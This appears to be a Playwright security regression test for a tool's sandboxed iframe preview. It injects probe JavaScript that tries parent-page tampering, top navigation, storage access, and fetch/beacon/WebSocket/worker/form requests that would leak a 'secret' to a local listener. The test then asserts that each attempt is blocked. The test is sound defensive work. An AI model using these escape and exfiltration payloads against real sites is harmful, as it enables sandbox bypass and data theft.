#!/usr/bin/env node
// Real Chromium security regression. PLAYWRIGHT_MODULE may point to an external install.
const playwright = require(process.env.PLAYWRIGHT_MODULE || 'playwright');
const engineName = process.env.SPLINELY_BROWSER || 'chromium'; // chromium | firefox | webkit (browser matrix)
const chromium = playwright[engineName];
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const http = require('node:http');
const {execFileSync} = require('node:child_process');
(async () => {
  const root = path.resolve(__dirname, '..');
  const cliBinary = process.env.SPLINELY_CLI || path.join(root,'target/debug/splinely-cli');
  if (!process.env.SPLINELY_SKIP_BUILD) execFileSync('cargo', ['build', '-p', 'splinely-cli'], {cwd:root, stdio:'inherit'});
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'splinely-isolated-'));
  const requests = [];
  const server = http.createServer((req,res) => { requests.push(req.url); res.end('network leak'); });
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  const target = `http://127.0.0.1:${server.address().port}/leak`;
  const project = JSON.parse(fs.readFileSync(path.join(root, 'examples/demo.splinely.json')));
  project.customJs = `
window.probe={executed:true};
for(const [key,fn] of Object.entries({
 parent:()=>parent.document.body.textContent='pwned',
 top:()=>top.location.href=${JSON.stringify(target)},
 storage:()=>localStorage.setItem('pwned','yes')
})) {try{fn();probe[key]='allowed';}catch(e){probe[key]=e.name;}}
probe.fetch='pending';fetch(${JSON.stringify(target)}).then(()=>probe.fetch='allowed',()=>probe.fetch='blocked');
try{navigator.sendBeacon(${JSON.stringify(target)},'secret')}catch(e){}
const img=new Image();img.src=${JSON.stringify(target)}+'?image';
try{new WebSocket(${JSON.stringify(target.replace('http:', 'ws:'))})}catch(e){}
try{new Worker(${JSON.stringify(target)}+'?worker')}catch(e){}
try{probe.popup=window.open(${JSON.stringify(target)})===null;}catch(e){probe.popup=true;probe.popupThrew=e.name;} // denied either way: Chromium returns null, Firefox throws
const form=document.createElementNS('http://www.w3.org/1999/xhtml','form');form.action=${JSON.stringify(target)};form.method='post';document.documentElement.append(form);try{form.submit()}catch(e){}
parent.postMessage({command:'execute',html:'pwned'},'*');
`;
  const input=path.join(dir,'input.json'), output=path.join(dir,'preview.html');
  fs.writeFileSync(input,JSON.stringify(project));
  execFileSync(cliBinary,['isolated-preview',input,'--output',output]);
  const browser = await chromium.launch({headless:true});
  try {
    const page=await browser.newPage();
    await page.goto('file://'+output);
    const assert=(condition,detail)=>{if(!condition)throw Error(detail);};
    assert(await page.locator('iframe').count()===0,'project frame exists before consent');
    assert(await page.locator('#run').isDisabled(),'run enabled without consent');
    await page.locator('#consent').check();await page.locator('#run').click();
    const frame=await (await page.locator('iframe').elementHandle()).contentFrame();
    await frame.waitForFunction(()=>window.probe?.fetch==='blocked');
    const probe=await frame.evaluate(()=>window.probe);
    assert(probe.executed && probe.parent==='SecurityError' && probe.top==='SecurityError' && probe.storage==='SecurityError' && probe.popup,JSON.stringify(probe));
    assert(await page.locator('h1').textContent()==='Isolated browser preview','parent altered');
    assert(await page.locator('iframe').getAttribute('sandbox')==='allow-scripts','sandbox expanded');
    // Self-navigation must also be blocked by the embedding page's frame-src policy.
    await frame.evaluate(url=>{location.href=url;},target+'?self');
    await page.waitForTimeout(500);
    assert(requests.length===0,'network escaped: '+JSON.stringify(requests));
    assert(page.url()==='file://'+output,'top navigated');
    assert(browser.contexts()[0].pages().length===1,'popup escaped');
    await page.locator('#stop').click();
    assert(await page.locator('iframe').count()===0,'stop retained frame');
    assert(await page.locator('#run').isDisabled(),'stop retained consent');
    await page.locator('#consent').check();await page.locator('#run').click();
    await page.evaluate(()=>window.dispatchEvent(new Event('pagehide')));
    assert(await page.locator('iframe').count()===0,'pagehide retained frame');
    assert(!await page.locator('#consent').isChecked(),'pagehide retained consent');
    await page.locator('#consent').check();await page.locator('#run').click();
    await page.reload();
    assert(await page.locator('iframe').count()===0,'reload retained execution');
    assert(!await page.locator('#consent').isChecked(),'reload restored consent');
    assert(await page.locator('#run').isDisabled(),'reload enabled execution');
    await page.locator('#consent').check();await page.locator('#run').click();
    await page.goto('about:blank');await page.goBack();
    assert(await page.locator('iframe').count()===0,'history retained execution');
    assert(!await page.locator('#consent').isChecked(),'history restored consent');
    assert(await page.locator('#run').isDisabled(),'history enabled execution');
    console.log('PASS (' + engineName + '): consent, execution, opaque parent/top/storage denial, CSP fetch/beacon/image/websocket/worker/form/self-navigation restrictions, popup denial, inert messages, stop/pagehide/reload/history (persisted BFCache restoration not asserted)');
  } finally { await browser.close(); server.close(); fs.rmSync(dir,{recursive:true,force:true}); }
})().catch(error=>{console.error(error);process.exit(1);});
